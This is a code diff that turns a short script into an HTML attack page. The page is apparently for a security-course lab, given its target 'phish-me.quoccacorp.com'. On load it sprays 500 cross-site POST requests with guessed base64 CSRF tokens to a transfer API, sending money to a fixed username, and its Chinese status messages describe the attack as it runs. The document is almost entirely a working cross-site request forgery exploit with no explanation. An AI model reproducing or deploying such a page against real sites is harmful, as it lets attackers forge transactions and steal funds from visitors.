@@ -1,20 +1,56 @@
-// Token spraying script hosted on the attacker's phishing page 
-const START = 7429; // Estimated global counter baseline 
-const COUNT = 500;  // Spray window size 
- 
-for (let i = 0; i < COUNT; i++) { 
-    const tokenInt = START + i; 
-    const token = btoa(tokenInt.toString());  
- 
-    const params = new URLSearchParams(); 
-    params.append('csrf_token', token); 
-    params.append('username', "z5628880"); 
-    params.append('amount', 1); 
- 
-    fetch("https://phish-me.quoccacorp.com/api/transfer", { 
-        method: "POST", 
-        mode: "no-cors", 
-        body: params, 
-        headers: { "Content-Type": "application/x-www-form-urlencoded" } 
-    }); 
-}
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>Transferring...</title>
+</head>
+<body>
+    <div id="status">正在初始化攻击负载...</div>
+    <ul id="log"></ul>
+
+    <script>
+        const ME = "z5628880"; 
+        const START = 7429; 
+        const COUNT = 500;  
+        const AMOUNT = 1;
+        const targetUrl = "https://phish-me.quoccacorp.com/api/transfer";
+
+        async function doPhish() {
+            const statusDiv = document.getElementById('status');
+            const logList = document.getElementById('log');
+
+            statusDiv.innerText = `正在对 Token 范围 ${START} - ${START + COUNT} 发起喷洒攻击...`;
+
+            for (let i = 0; i < COUNT; i++) {
+                const tokenInt = START + i;
+                const token = btoa(tokenInt.toString()); 
+
+                const params = new URLSearchParams();
+                params.append('csrf_token', token);
+                params.append('username', ME);
+                params.append('amount', AMOUNT);
+
+                fetch(targetUrl, {
+                    method: "POST",
+                    mode: "no-cors",
+                    body: params,
+                    headers: {
+                        "Content-Type": "application/x-www-form-urlencoded"
+                    }
+                });
+
+                if (i % 10 === 0) {
+                    const li = document.createElement('li');
+                    li.innerText = `已发送至 Token: ${tokenInt} (${token})`;
+                    logList.appendChild(li);
+                }
+
+                await new Promise(r => setTimeout(r, 50)); 
+            }
+            statusDiv.innerText = "攻击负载已全部发出。";
+        }
+
+        window.onload = doPhish;
+    </script>
+</body>
+</html>
